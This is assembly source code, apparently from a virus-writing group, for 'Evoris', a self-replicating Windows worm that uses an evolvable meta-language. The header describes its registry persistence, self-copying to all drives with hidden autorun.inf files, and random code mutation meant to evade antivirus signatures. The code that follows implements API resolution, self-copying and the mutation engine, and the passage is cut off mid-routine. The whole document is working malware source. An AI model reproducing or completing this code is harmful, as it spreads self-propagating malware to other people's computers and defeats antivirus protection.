;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;
;; Evoris
;; by SPTH
;; November 2010
;;
;;  This worm takes use of an evolvable meta-language concept, which has
;;  been presented in an article "Taking the redpill: Artificial Evolution
;;  in native x86 systems".
;;
;;  To achieve evolution it is necessary to have replication, mutation
;;  and selection.
;;
;;
;;
;;  Replication:
;;  It makes a registry-entry to start at every Windows Startup.
;;  All ~25sec it searchs for all removeable, network, fixed drives and
;;  copies itself to them. For removable and network drives, it creates a
;;  hidden autorun.inf:
;;  - - -
;;  [Autorun]
;;  ShellExecute=filename.exe
;;  UseAutoplay=1              ; with this additional line, it works
;;  - - -
;;
;;
;;
;;  Mutation:
;;  The program can use three types of mutations:
;;  Bitflip (point mutation): it changes a single bit of the code (87.5%)
;;  XCHG (translocation): it exchanges the position of 8 bytes (8 commands)
;;                        ABCD EFGH -> EFGH ABCD (25.0%)
;;  Insertion: it can move some part of the code, and fill the rest with NOPs
;;             (20%)
;;
;;
;;
;;  Selection:
;;  The natural selection for malware will come from antivirus scanners.
;;  As soon as the signature of a certain representation of the worm is
;;  in the database of AV programs, it can not spread alot anymore. Just those
;;  mutations can spread, which are so different to the original in the
;;  database, that it is not recognized anymore. This is a very natural
;;  selection process.
;;  There may be other selective advantages such as new functionalities - for
;;  a more detailed see the article mentioned above.
;;
;;
;;
;;  Metalanguage:
;;  It has been shown in different approaches of artificial simulations,
;;  that evolution can be achieved if the artificial chemistry fulfills
;;  several conditions: A small instruction set, separation of arguments
;;  and operations, and non-direct addressing.
;;  In an x86 environment, this can be done by creating a special meta-
;;  language. The meta-language in this approach is very near connected
;;  to the natural biosynthese:
;;
;;     Artificial   --   Natural
;;     Bit          --   Nucleobase
;;     Byte         --   Codon
;;     Base command --   Amino acid
;;     Function     --   Protein
;;     Translator   --   tRNA
;;
;;  To achieve evolution, it is also required that there are enough
;;  neutral mutations. In an short analyse "Mutational Robustness in x86
;;  systems", it has been shown that the most robust concept is meta-langauge
;;  with a redundant alphabeth.
;;
;;
;;
;;
;;  Alphabeth:
;;  The alphabeth contains the base-commands of the language:
;;
;;  nopsA, nopsB, nopsD, nopdA, nopdB, nopdD
;;  saveWrtOff, saveJmpOff
;;  writeByte, writeDWord, save, addsaved, subsaved
;;  getDO, getdata, getEIP
;;  push, pop, pushall, popall
;;  zer0, mul, div, shl, shr, and, xor, add0001, add0004, add0010, add0040,
;;  add0100, add0400, add1000, add4000, sub0001, nopREAL
;;  JnzUp, JnzDown, call
;;  CallAPILoadLibrary, CallAPISleep
;;
;;  These are the 42 commands of the metalanguage. Each command is represented
;;  by a 8bit value. As there are 256 (2^8) possibilities to write a 8bit
;;  code there is a big source for redundancy - just as in nature, where 20
;;  amino acids are coded by 64 (4^3) possibilities to write the nucleobases.
;;
;;
;;
;;
;;  Evolvable API calls:
;;  kernel32.dll and advapi32.dll are loaded thru LoadLibraryA. The export
;;  table is parsed, and a 12bit hash of the exported API is created. If that
;;  hash is the same as a hardcoded 12bit hash in the file, the API address is
;;  saved.
;;  The idea is: there are ~1000 exported APIs in kernel32.dll, there are
;;  ~4000 possibilities how to write a 12bit code. That means, by a single
;;  bit-flip of the API hash, there is a possibility of ~25% that a new
;;  valid API will be called.
;;
;;  CallAPISleep: This API could be found by the algorithm with WinXP,
;;  but in WinVista, there are two new APIs (SleepConditionVariableCS,
;;  SleepConditionVariableSRW) between Sleep and SleepEx. As the Algorithm
;;  uses the first 10bytes of the API name, for short APIs it also uses the
;;  first few of the next API-name. This is no problem usually, but due
;;  to bad luck, it is for Sleep. I could not use SleepEx eighter, because
;;  of the new Function SortCloseHandle, which gives a different hash.
;;  The simplest possibility was to use a hardcoded function call.
;;
;;
;;
;;  Tested at WinXP SP3, but it should also work with WinVista+.
;;
;;
;;  Thanks to: hh86 && qkumba
;;  Greets goes to herm1t, roy g biv, all ex-rRlf members &
;;                 & all serious researchers
;;
;;
;;  Evoris comes from a unification of Evolution and Virus.
;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;


include 'E:\Programme\FASM\INCLUDE\win32ax.inc'


.data
	include 'data_n_equs.inc'


.code
start:



	invoke	VirtualAlloc, \
		0x0, \
		0x10000, \		; 64 KB RAM
		0x1000, \
		PAGE_EXECUTE_READWRITE
	mov	[Place4Life], eax

	mov	edx, 0x0				; EDX will be used as the counter of this loop
	WriteMoreToMemory:
		mov	ebx, 0x0			; EBX=0;
		mov	bl, byte[edx+StAmino]		; BL=NUMBER OF AMINO ACID
		shl	ebx, 3				; EBX*=8;
		mov	esi, StartAlphabeth		; ESI ... Alphabeth offset
		add	esi, ebx			; ESI+=EBX; ESI ...  offset of the current amino acid

		mov	ebx, edx			; EBX ... current number of amino acid
		shl	ebx, 3				; EBX ... lenght of amino acids before this one
		mov	edi, [Place4Life]		; EDI ... Memory address
		add	edi, ebx			; Offset of current memory for 8 byte code

		mov	ecx, 8				; ECX ... 8
		rep	movsb				; Write ECX bytes from ESI to EDI
							; Write 8 bytes from Alphabeth to Memory
		inc	edx				; Increase EDX
	cmp	edx, (EndAmino-StAmino)
	jne	WriteMoreToMemory

	call	[Place4Life]				; Lets start!!!






; ##################################################################
; Alphabeth
StartAlphabeth:
include 'alphabeth.inc'
EndAlphabeth:

; ##################################################################







; ##################################################################
; Macros
macro addnumber arg
{
    x=arg
    if x>=0x10000
	db _zer0
	db _add0010
	db _save
	db _zer0
	while x>=0x10000
	    if x>=0x40000000
		db _add4000
		x=x-0x40000000
	    else if x>=0x10000000
		db _add1000
		x=x-0x10000000
	    else if x>=0x04000000
		db _add0400
		x=x-0x04000000
	    else if x>=0x01000000
		db _add0100
		x=x-0x01000000
	    else if x>=0x00400000
		db _add0040
		x=x-0x00400000
	    else if x>=0x00100000
		db _add0010
		x=x-0x00100000
	    else if x>=0x00040000
		db _add0004
		x=x-0x00040000
	    else if x>=0x00010000
		db _add0001
		x=x-0x00010000
	    end if
	end while
	db _shl
    end if

    while x<>0
	if x>=0x4000
	    db _add4000
	    x=x-0x4000
	else if x>=0x1000
	    db _add1000
	    x=x-0x1000
	else if x>=0x0400
	    db _add0400
	    x=x-0x0400
	else if x>=0x0100
	    db _add0100
	    x=x-0x0100
	else if x>=0x0040
	    db _add0040
	    x=x-0x0040
	else if x>=0x0010
	    db _add0010
	    x=x-0x0010
	else if x>=0x0004
	    db _add0004
	    x=x-0x0004
	else if x>=0x0001
	    db _add0001
	    x=x-0x0001
	end if
     end while
}



macro GetAddress arg
{
    db _getDO
    addnumber (arg-DataOffset)
}



macro CallAPI arg
{
    db _getDO
    addnumber (arg-DataOffset)
    db _call
}



macro CalcNewRandNumberAndSaveIt
{
	GetAddress RandomNumber

	db _saveWrtOff
	db _getdata
	db _nopdA		    ; eax=[RandomNumber]

	db _zer0
	addnumber 1103515245

	db _mul 		    ; eax*=1103515245 % 2^32

	db _zer0
	addnumber 12345
	db _save

	db _nopsA
	db _addsaved		    ; eax+=12345 % 2^32

	db _writeDWord		    ; mov [RandomNumber], ebx
}
; ##################################################################







; ##################################################################
; Amino Acids
StAmino:


; ############################################################################
; ############################################################################
; ############################################################################
; #####
; #####  Here the genom gets the Addresses of the Windows APIs.
; #####  It loads via LoadLibrary the kernel32.dll and advapi32.dll,
; #####  searchs in the Export Table for the adequade API (creating
; #####  an internal 12 bit checksum, and compares it with some hardcoded
; #####  12bit values). This procedere should be evolvable.
; #####
; #####  Optimum would have been to call the Windows APIs by its
; #####  Ordinal Numbers, but they change at every release of Windows.
; #####
; #####  At Linux, evolvable API calls are already presented, as you
; #####  call int 0x80 with a specific number in eax which represents
; #####  the API number.
; #####
; #####

StAminoAcids1:
	times 1234 db _nopREAL

	GetAddress stDLLkernel32	    ; write "kernel32.dll" and "advapi32.dll"
	db _saveWrtOff			    ; to the data-section. This will be used
	db _nopdA			    ; by LoadLibraryA as argument later
	addnumber 'kern'
	db _writeDWord

	db _nopsA
	db _add0004
	db _saveWrtOff
	db _nopdA
	addnumber 'el32'
	db _writeDWord

	db _nopsA
	db _add0004
	db _saveWrtOff
	db _nopdA
	addnumber '.dll'
	db _writeDWord

	GetAddress stDLLadvapi32
	db _saveWrtOff
	db _nopdA
	addnumber 'adva'
	db _writeDWord

	db _nopsA
	db _add0004
	db _saveWrtOff
	db _nopdA
	addnumber 'pi32'
	db _writeDWord

	db _nopsA
	db _add0004
	db _saveWrtOff
	db _nopdA
	addnumber '.dll'
	db _writeDWord


	GetAddress stDLLkernel32
	db _push
	db _CallAPILoadLibrary	    ; invoke LoadLibrary, "kernel32.dll"


	GetAddress hDLLlibrary32
	db _saveWrtOff


	db _nopsA
	db _writeDWord		    ; mov dword[hDLLkernel32], eax

	db _save		    ; Save kernel32.dll position

	addnumber 0x3C
	db _getdata		    ; mov RegB, dword[hDLLkernel32+0x3C]

				    ; = Pointer to PE Header of kernel32.dll
	db _addsaved		    ; relative -> absolut

	addnumber 0x78
	db _getdata		    ; Export Tables
	db _addsaved		    ; relative -> absolut
	addnumber 0x1C		    ; Addresse Table

	db _nopdA		    ; temporarily save Offset of Addresse Table in RegA

	GetAddress hAddressTable
	db _saveWrtOff		    ; WriteOffset=hAddressTable

	db _nopsA		    ; restore RegA=Addresse Tables
	db _getdata		    ; Pointer To Addresse Table
	db _addsaved		    ; relative -> absolut
	db _writeDWord		    ; mov dword[hAddressTable], (Pointer to Addresse Table)

	GetAddress hNamePointerTable
	db _saveWrtOff		    ; WriteOffset=hNamePointerTable

	db _nopsA		    ; BC1=Addresse Table
	addnumber 0x4		    ; BC1=Name Pointer Table
	db _nopdA

	db _getdata		    ; Pointer To Name Table
	db _addsaved		    ; relative -> absolut
	db _writeDWord		    ; mov dword[hNamePointerTable], (Pointer to Name Pointer Table)

	GetAddress hOrdinalTable
	db _saveWrtOff		    ; WriteOffset=hOrdinalTable

	db _nopsA
	addnumber 4		    ; BC=Pointer to Ordinal Table

	db _getdata		    ; Ordinal Table
	db _addsaved		    ; relative -> absolut
	db _writeDWord		    ; mov dword[hOrdinalTable], (Pointer to Ordinal Table)



	GetAddress APINumber
	db _saveWrtOff
	db _zer0
	addnumber APINumberKernel
	db _writeDWord		    ; Save number of kernel32.dll APIs


	GetAddress hAddressePointer
	db _saveWrtOff
	GetAddress APIAddresses
	db _writeDWord	    ; Saves the AddressePointer


	GetAddress hMagicNumberPointer
	db _saveWrtOff
	GetAddress APIMagicNumbers
	db _writeDWord	    ; Saves the MagicNumber Pointer

	db _zer0
	addnumber 43
	db _push

; FindAllAPIs
	db _getEIP
	db _sub0001
	db _sub0001
	db _sub0001
	db _sub0001
	db _sub0001
	db _saveJmpOff	    ; mov BA2, EPI  - for further API searching in different DLLs

	db _pushall

		db _zer0
		db _nopdB	    ; RegB = Counter for first instance loop = 0

		GetAddress hAddressePointer
		db _getdata
		db _nopdA	    ; RegA = Pointer to Buffer for API Addresse

		GetAddress hMagicNumberPointer
		db _getdata
		db _nopdD	    ; RegD = Pointer to Magic Numbers for APIs



	    ; FindAllAPIsNext
		db _getEIP
		db _sub0001
		db _sub0001
		db _sub0001
		db _sub0001
		db _sub0001
		db _saveJmpOff	    ; mov BA2, EPI


		db _pushall
			; RegA=free  | used for pointer within the Name Pointer Table
			; RegB=free  | used as temporary buffer
			; RegD=MagicNumber for API
			; Stack:  | counter (number of APIs checked in kernel32.dll)

			GetAddress hNamePointerTable
			db _getdata
			db _nopdA		; Pointer to Name Pointer Table (points to first API)

			db _zer0
			db _sub0001
			db _push		; counter

		   ; SearchNextAPI:
			db _getEIP
			db _sub0001
			db _sub0001
			db _sub0001
			db _sub0001
			db _sub0001
			db _saveJmpOff		; mov BA2, EPI

			db _pop
			addnumber 0x1		; counter++
			db _push

			GetAddress hDLLlibrary32
			db _getdata
			db _save		; kernel32.dll position

			db _nopsA		; Pointer to NamePointerTable
			db _getdata		; Points to API name
			db _addsaved		; relative -> absolut
			db _nopdB		; save Pointer to API name


			; BC1=dword[APINAME]
			db _getdata		; BC1=dword[APINAME]
			db _save		; BC2=dword[APINAME]

			db _nopsA
			addnumber 4		; Points to next API name
			db _nopdA		; Has just effects in next loop

			; BC1=dword[APINAME]+dword[APINAME+1]
			db _nopsB
			addnumber 1
			db _getdata		; BC1=dword[APINAME+1]
			db _addsaved		; BC1+=dword[APINAME]=dword[APINAME]+dword[APINAME+1]
			db _save

			; BC1=(dword[APINAME]+dword[APINAME+1]) XOR dword[APINAME+2]
			db _nopsB
			addnumber 2
			db _getdata		; BC1=dword[APINAME+2]
			db _xor 		; BC1 XOR (dword[APINAME]+dword[APINAME+1])

			db _push		; save at Stack, as sub is not invertable
						; (sub a-b) != (sub b-a)

			; BC1-=dword[APINAME+3]
			db _nopsB
			addnumber 3
			db _getdata
			db _save		; BC2=dword[APINAME+3]
			db _pop 		; restore B1
			db _subsaved		; B1-=dword[APINAME+3]
			db _save

			; BC1=BC1 XOR dword[APINAME+6]
			db _nopsB
			addnumber 6
			db _getdata		; dword[APINAME+6]
			db _xor 		; B1=dword[APINAME+6] XOR B1

			db _push		; save at Stack again (position dependent, see above)

			; BC1-=dword[APINAME+7]
			db _nopsB
			addnumber 7
			db _getdata
			db _save		; BC2=dword[APINAME+7]
			db _pop 		; restore B1
			db _subsaved		; B1-=dword[APINAME+7]
			db _save

			; BC1+=dword[APINAME+5]
			db _nopsB
			addnumber 5
			db _getdata		; BC1=dword[APINAME+5]
			db _addsaved		; BC1+=dword[APINAME+5]
			db _save


			; BC1=BC1 XOR dword[APINAME+9]
			db _nopsB
			addnumber 9
			db _getdata		; dword[APINAME+9]
			db _xor 		; B1=dword[APINAME+9] XOR B1

			db _push		; save at Stack again (position dependent, see above)

			; BC1-=dword[APINAME+10]
			db _nopsB
			addnumber 10
			db _getdata
			db _save		; BC2=dword[APINAME+10]
			db _pop 		; restore B1
			db _subsaved		; B1-=dword[APINAME+10]

			db _nopdB		; save MagicNumber of this API


			db _zer0
			addnumber 0x0FFF
			db _save		; save 0xFFF in BC2

			db _nopsB
			db _and 		; BC1=dword[MagicNumberOfThisAPI] && 0x0FFF
			db _nopdB

			db _nopsD		; Get Pointer to API MagicWord
			db _getdata
			db _and 		; BC1=dword[MagicNumberSearchAPI] && 0x0FFF
			db _save		; save

			db _nopsB		; Get MagicNumber of current API again
			db _xor 		; (dword[MagicNumberSearchAPI] && 0x0FFF) XOR dword[MagicNumberOfThisAPI] && 0x0FFF
						; If zero, assume that we found API
		    db _JnzUp


			db _zer0
			addnumber 1
			db _save		; BC2=1

			db _pop 		; Get Counter from Stack
			db _shl 		; BC1=counter*2 (because Ordinal Table has just 2byte Entries)
						; (=no DLLs with more than 65535 functions?!)
			db _save

			GetAddress hOrdinalTable
			db _getdata
			db _addsaved		; Points to ordinal number of the API

			db _push
			db _zer0
			addnumber 0xFFFF
			db _save
			db _pop 		; BC2=0xFFFF

			db _getdata		; BC1=Ordinal Number of API
						; Ordinal Number is a word, so we have to set the high word to zero
			db _and 		; BC1=dword[Ordinal] && 0xFFFF

			db _push
			db _zer0
			addnumber 2
			db _save
			db _pop
			db _shl 		; BC1=Ordinal*4, as Addresse to Function is a dword

			db _save

			GetAddress hAddressTable
			db _getdata

			db _addsaved		; BC1 points to Addresse of API Function
			db _getdata		; BC1=Addresse of API Function
			db _save

			GetAddress hDLLlibrary32
			db _getdata
			db _addsaved		; relative -> absolut
						; BC1 contains the Addresse of the API in (kernel32) memory


			db _nopdB		; save the Addresse in RegB
			GetAddress hAddressePointer
			db _getdata		; Pointer to the buffer where we save the API addresse
			db _saveWrtOff		; We will write to this Addresse

			db _nopsB		; restore API Addresse

			db _writeDWord		; Save the API Function Addresse in the Function Buffer!!!



		db _popall

		GetAddress hAddressePointer
		db _saveWrtOff	    ; The buffer where we save the pointer

		db _nopsA
		addnumber 0x4	    ; Next Buffer for API Adresse

		db _writeDWord	    ; save pointer
		db _nopdA	    ; save different (prevents a more messy code)

		db _nopsD	    ; Next Magic Number for API
		addnumber 0x4
		db _nopdD

		db _nopsB
		addnumber 0x1	    ; Increase API-Counter
		db _nopdB
		db _save

		GetAddress APINumber
		db _getdata

		db _subsaved	    ; cmp Counter, APINumber
		db _JnzUp	    ; Jnz FindAllAPIsNext

	    ; end FindAllAPIsNext

	db _popall
	; FoundAPI

; end FindAllAPIs in kernel32.dll

	GetAddress stDLLadvapi32
	db _push
	db _CallAPILoadLibrary	    ; invoke LoadLibrary, "kernel32.dll"


	GetAddress hDLLlibrary32
	db _saveWrtOff


	db _nopsA
	db _writeDWord		    ; mov dword[hDLLkernel32], eax

	db _save		    ; Save kernel32.dll position

	addnumber 0x3C
	db _getdata		    ; mov RegB, dword[hDLLkernel32+0x3C]

				    ; = Pointer to PE Header of kernel32.dll
	db _addsaved		    ; relative -> absolut

	addnumber 0x78
	db _getdata		    ; Export Tables
	db _addsaved		    ; relative -> absolut
	addnumber 0x1C		    ; Addresse Table

	db _nopdA		    ; temporarily save Offset of Addresse Table in RegA

	GetAddress hAddressTable
	db _saveWrtOff		    ; WriteOffset=hAddressTable

	db _nopsA		    ; restore RegA=Addresse Tables
	db _getdata		    ; Pointer To Addresse Table
	db _addsaved		    ; relative -> absolut
	db _writeDWord		    ; mov dword[hAddressTable], (Pointer to Addresse Table)

	GetAddress hNamePointerTable
	db _saveWrtOff		    ; WriteOffset=hNamePointerTable

	db _nopsA		    ; BC1=Addresse Table
	addnumber 0x4		    ; BC1=Name Pointer Table
	db _nopdA

	db _getdata		    ; Pointer To Name Table
	db _addsaved		    ; relative -> absolut
	db _writeDWord		    ; mov dword[hNamePointerTable], (Pointer to Name Pointer Table)

	GetAddress hOrdinalTable
	db _saveWrtOff		    ; WriteOffset=hOrdinalTable

	db _nopsA
	addnumber 4		    ; BC=Pointer to Ordinal Table

	db _getdata		    ; Ordinal Table
	db _addsaved		    ; relative -> absolut
	db _writeDWord		    ; mov dword[hOrdinalTable], (Pointer to Ordinal Table)


	GetAddress APINumber
	db _saveWrtOff
	db _zer0
	addnumber APINumberAdvapi
	db _writeDWord		    ; Save number of kernel32.dll APIs

	GetAddress hAddressePointer
	db _saveWrtOff
	GetAddress APIAddressesReg
	db _writeDWord	    ; Saves the AddressePointer


	GetAddress hMagicNumberPointer
	db _saveWrtOff
	GetAddress APIMagicNumbersReg
	db _writeDWord	    ; Saves the MagicNumber Pointer


	db _zer0
	addnumber 42
	db _save
	db _pop
	db _sub0001
	db _push
	db _add0001
	db _xor
	db _JnzUp

	db _pop 		   ; Remove trash from stack

; ############################################################################
; ############################################################################
; ############################################################################
; #####
; #####   First child will have mutations within the Amino Acids
; #####   (no mutations in the alphabeth or the filestructure)
; #####

	db _zer0
	addnumber 0x8007
	db _push
	CallAPI hSetErrorMode

	CallAPI hGetTickCount

	GetAddress RandomNumber
	db _saveWrtOff
	db _nopsA
	db _writeDWord		    ; mov dword[RandomNumber], RegA

	db _zer0
	db _nopdB		    ; mov RegB, 0


;   RndNameLoop:
	db _getEIP
	db _sub0001
	db _sub0001
	db _sub0001
	db _sub0001
	db _sub0001
	db _saveJmpOff		    ; mov esi, epi

	GetAddress RandomNumber

	db _getdata
	db _nopdA		    ; mov eax, [RandomNumber]


	db _zer0
	db _nopdD		    ; mov edx, 0

	db _zer0
	addnumber 26

	db _div 		    ; div ebx

	db _nopsD
	addnumber 97
	db _nopdD		    ; add edx, 97

	db _nopsB      ; ebx=ebp=count
	db _save       ; ebp=ebx=ecx=count

	GetAddress RandomFileName
		       ; ebx=rfn, ebp=ecx=count
	db _addsaved   ; ebx=rfn+count, ebp=ecx=count
	db _saveWrtOff ; edi=rfn+count, ebx=rfn+count, ebp=ecx=count


	db _nopsD
	db _writeByte		    ; mov byte[ecx+RandomFileName], dl

	CalcNewRandNumberAndSaveIt

	db _nopsB
	db _add0001
	db _nopdB
	db _save		    ; inc counter

	db _zer0
	addnumber 8
	db _subsaved		    ; cmp counter, 8


	db _JnzUp		    ; jnz esi
; loop RndNameLoop

	GetAddress rndext
	db _saveWrtOff
	db _zer0
	addnumber ".exe"
	db _writeDWord		    ; create extention

	CallAPI hGetCommandLineA
	db _zer0
	addnumber 0xFF
	db _save

	db _nopsA
	db _getdata
	db _and

	db _nopdB	    ; RegB=1st byte of filename
	db _zer0
	addnumber 34	    ; "
	db _nopdD	    ; RegD=34


	db _nopsB
	db _save
	db _nopsD
	db _subsaved


	db _JnzDown

	db _nopsA
	db _add0001
	db _nopdA
	db _nopREAL

	db _nopsA
	db _push	       ; Save RegA at stack

; FindEndOfString:
	db _getEIP
	db _sub0001
	db _sub0001
	db _sub0001
	db _sub0001
	db _sub0001
	db _saveJmpOff	       ; mov esi, epi

	db _nopsA
	db _add0001
	db _nopdA

	db _zer0
	addnumber 0xFF
	db _save
	db _nopsA
	db _getdata
	db _and
	db _nopdD		; RegD=(dword[Name+count]&& 0xFF)

	db _zer0
	addnumber 34		; "
	db _save
	db _nopsB		; 1st Byte of filename
	db _subsaved
	db _JnzDown

	db _nopsD
	db _xor
	db _JnzUp
	db _nopREAL
; EndFindEndOfString:

	db _zer0
	addnumber 34		; "
	db _nopsB		; 1st Byte of filename
	db _subsaved
	db _JnzDown

	db _nopsA
	db _saveWrtOff
	db _zer0
	db _writeByte


	db _pop
	db _nopdA


	GetAddress Driveletter3-1
	db _saveWrtOff
	db _zer0
	addnumber 0x5C3A4300		 ; 0x0, "C:\"
	db _writeDWord

	GetAddress virusname
	db _saveWrtOff
	db _zer0
	addnumber "evor"
	db _writeDWord

	GetAddress virusname+4
	db _saveWrtOff
	db _zer0
	addnumber "isss"
	db _writeDWord			; Construct virusfilename

	GetAddress virext
	db _saveWrtOff
	db _zer0
	addnumber ".exe"
	db _writeDWord			; create extention


	db _nopsA
	db _push		       ; Save pointer to filename buffer
	db _zer0
	db _push
	GetAddress Driveletter3
	db _push
	db _nopsA
	db _push
	CallAPI hCopyFileA	       ; Copy myself to C:\VIRUSNAME!!! (will not be mutated)

	db _pop
	db _nopdA
	db _zer0
	db _push
	GetAddress RandomFileName
	db _push
	db _nopsA
	db _push
	CallAPI hCopyFileA	       ; Make a copy of myself with random name
				       ; this copy will be mutated and spreaded




	db _zer0
	db _push
	db _push
	addnumber 3
	db _push
	db _zer0
	db _push
	db _add0001
	db _push
	db _sub0001
	addnumber 0xC0000000
	db _push
	GetAddress RandomFileName
	db _push
	CallAPI hCreateFileA


	GetAddress FileHandle
	db _saveWrtOff
	db _nopsA
	db _writeDWord		    ; mov dword[FileHandle], RegA

	db _save

	GetAddress FileSize

	db _push
	db _zer0
	db _addsaved
	db _push
	CallAPI hGetFileSize

	GetAddress FileSize
	db _saveWrtOff
	db _nopsA
	db _writeDWord		    ; mov dword[FileSize], RegA

	db _zer0
	db _push
	db _addsaved
	db _push
	db _zer0
	db _push
	addnumber 4
	db _push
	db _zer0
	db _push
	GetAddress FileHandle
	db _getdata
	db _push
	CallAPI hCreateFileMappingA

	GetAddress MapHandle




	db _saveWrtOff
	db _nopsA
	db _writeDWord		     ; mov dword[MapHandle], RegA

	db _save
	GetAddress FileSize

	db _getdata
	db _push   ; [FileSize]
	db _zer0
	db _push   ; 0
	db _push   ; 0
	addnumber 2
	db _push
	db _zer0
	db _addsaved
	db _push   ; MapHandle

	CallAPI hMapViewOfFile

	GetAddress MapPointer

	db _saveWrtOff
	db _nopsA
	db _writeDWord		    ; mov dword[MapPointer], RegA

	db _nopsA
	db _nopdB		    ; mov RegB, RegA+AminoStartInMap




; ############################################################################
; ############################################################################
; #####
; #####  Here the mutation happens: Bitmutation, exchange of codons, ...
; #####


;ANextByteInChain:
	db _getEIP
	db _sub0001
	db _sub0001
	db _sub0001
	db _sub0001
	db _sub0001
	db _saveJmpOff		    ; mov BA2, EPI

	db _nopsB
	db _push		    ; push counter


; ############################################################################
; ##### Start Bit-Flip Mutation (Point-Mutation)

	db _zer0
	addnumber 12
	db _save

	GetAddress RandomNumber

	db _getdata
	db _shr
	db _push

	db _zer0
	addnumber 7
	db _save

	db _pop
	db _and 		    ; BC1=[RandomNumber shr 12] && 0111b
	db _save

	db _zer0
	addnumber 1
	db _shl 		    ; shl BC1, BC2
	db _save

	db _pop
	db _push
	db _saveWrtOff		    ; BA1=[MapPointer]+counter

	db _getdata		    ; mov BC1, dword[BC1]
	db _xor 		    ; xor BC1, BC2
	db _nopdB		    ; save changed byte


	db _zer0
	addnumber 7
	db _save

	GetAddress RandomNumber

	db _getdata
	db _nopdA

	db _zer0
	db _nopdD

	addnumber VarThreshold1

	db _div
	db _nopsD
	db _subsaved
	db _JnzDown

	db _nopsB		    ; restore
	db _writeByte		    ; save mutation!
	db _nopREAL
	db _nopREAL

; ##### Finished Bit-Flip Mutation (Point-Mutation)
; ############################################################################


	CalcNewRandNumberAndSaveIt


; ############################################################################
; ##### Start codons exchange


	GetAddress xchgBuffer
	db _saveWrtOff

	db _pop
	db _push			; get counter

	db _getdata
	db _writeDWord			; xchgBuffer=dword[counter]

	db _pop
	db _push			; get counter
	db _saveWrtOff			; save destination for potential writing

	addnumber 4
	db _getdata
	db _nopdB			; RegB=dword[counter+4]


	db _zer0
	addnumber 7
	db _save
	GetAddress RandomNumber

	db _getdata
	db _nopdA

	db _zer0
	db _nopdD

	addnumber xchgThreshold1

	db _div
	db _nopsD
	db _subsaved
	db _JnzDown		    ; if not zero, dont exchange codons

	db _nopsB		    ; restore
	db _writeDWord		    ; save mutation!
	db _nopREAL
	db _nopREAL

	GetAddress xchgBuffer
	db _getdata

	db _nopdB

	db _pop
	db _push		    ; get counter
	addnumber 4
	db _saveWrtOff


	db _zer0
	addnumber 7
	db _save
	GetAddress RandomNumber

	db _getdata
	db _nopdA

	db _zer0
	db _nopdD

	addnumber xchgThreshold1

	db _div
	db _nopsD
	db _subsaved

	db _JnzDown		    ; if not zero, dont exchange codons

	db _nopsB		    ; restore
	db _writeDWord		    ; save mutation!
	db _nopREAL
	db _nopREAL


; ##### Finished codons exchange
; ############################################################################

	CalcNewRandNumberAndSaveIt


	db _pop
	db _add0001
	db _nopdB		    ; inc counter

	GetAddress MapPointer

	db _getdata
	db _save
	db _zer0

	GetAddress FileSize
	db _getdata

	db _addsaved
	db _save		    ; mov save, [MapPointer]+GenomEndInMap

	db _nopsB
	db _subsaved		    ; cmp counter, [MapPointer]+GenomEndInMap
	db _JnzUp		    ; jnz esi
; loop ANextByteInChain



; ############################################################################
; ##### Start of Insertion

; InsertA ... End Position of moving Block
;         A = rand() % Filesize

; Insertx ... Size of moving Block (A-x=Start of moving Block)
;         x = A + ( rand() % (Filesize-A) )

; y       ... Bytes to be inserted (A-x+y=New start of moved Block)
;         y = rand() mod 32

	GetAddress RandomNumber

	db _getdata
	db _nopdA		    ; mov RegA, [RandomNumber]

	db _zer0
	db _nopdD		    ; mov RegD, 0

	GetAddress FileSize
	db _getdata

	db _div 		    ; div BC1


	GetAddress InsertA
	db _saveWrtOff

	db _nopsD
	db _push		    ; Save relative InsertA at Stack

	db _save

	GetAddress MapPointer
	db _getdata
	db _addsaved		    ; relative -> absolut

	db _writeDWord		    ; Save Position


	CalcNewRandNumberAndSaveIt  ; New random number for getting Insertx

	db _nopdA		    ; RegA=random number
	db _zer0
	db _nopdD		    ; RegD=0

	GetAddress Insertx
	db _saveWrtOff

	db _pop
	db _save		    ; BC2=relative InsertA

	GetAddress FileSize
	db _getdata
	db _subsaved		    ; BC1=(FileSize-A)

	db _div 		    ; rand()/(FileSize-A)

	db _nopsD		    ; BC1=rand() % (FileSize-A)
	db _add0001		    ; (for loop)
	db _writeDWord		    ; Save to Insertx



	CalcNewRandNumberAndSaveIt  ; New random number for getting Insertx
	db _nopdA

	db _zer0
	db _nopdD		    ; RegD=0

	addnumber 32
	db _div

	GetAddress Inserty
	db _saveWrtOff

	db _nopsD		    ; BC1=rand() % 32
	db _add0001
	db _writeDWord		    ; y to Inserty
	db _save		    ; save y


	GetAddress InsertA
	db _getdata
	db _nopdA		    ; RegA=A

	db _addsaved		    ; BC1=A+y
	db _nopdB		    ; RegB=A+y


	CalcNewRandNumberAndSaveIt

	db _zer0
	addnumber 3
	db _save
	GetAddress RandomNumber

	db _getdata
	db _nopdA
	db _zer0
	db _nopdD

	addnumber InsertThreshold1

	db _div
	db _nopsD
	db _subsaved

	db _push		; Save Result

;        InsertA = A
;        Insertx = x
;        InsertWrt = A+y
;        RegB=A+y

;Insert next byte:
	db _getEIP
	db _sub0001
	db _sub0001
	db _sub0001
	db _sub0001
	db _sub0001
	db _saveJmpOff	    ; mov BA2, EPI



	GetAddress InsertA
	db _saveWrtOff
	db _getdata
	db _sub0001		   ; A--
	db _writeDWord


	db _getdata		    ; BC1=dword[A]
	db _nopdA


	db _nopsB		    ; BC1=A+y
	db _saveWrtOff		    ; Write Offset=A+y
	db _sub0001		    ; BC1--
	db _nopdB		    ; save WriteOffset again


	db _pop 		    ; If BC1=0: mutate
	db _push
	db _add0001
	db _sub0001		     ; Get the zer0 flag
	db _JnzDown

	db _nopsA
	db _nopREAL
	db _nopREAL
	db _writeByte		    ; byte[A+y]=byte[A]


	GetAddress Insertx
	db _saveWrtOff
	db _getdata
	db _sub0001
	db _writeDWord		    ; Save new counter

	db _JnzUp
;End insert next byte


;Fill with NOPs:
	db _getEIP
	db _sub0001
	db _sub0001
	db _sub0001
	db _sub0001
	db _sub0001
	db _saveJmpOff	    ; mov BA2, EPI



	db _nopsB		    ; BC1=A-x+y
	db _saveWrtOff		    ; Write Offset=A-x+y
	db _sub0001		    ; BC1--
	db _nopdB		    ; save WriteOffset again


	db _zer0
	addnumber _nopREAL
	db _nopdA

	db _pop
	db _push
	db _add0001
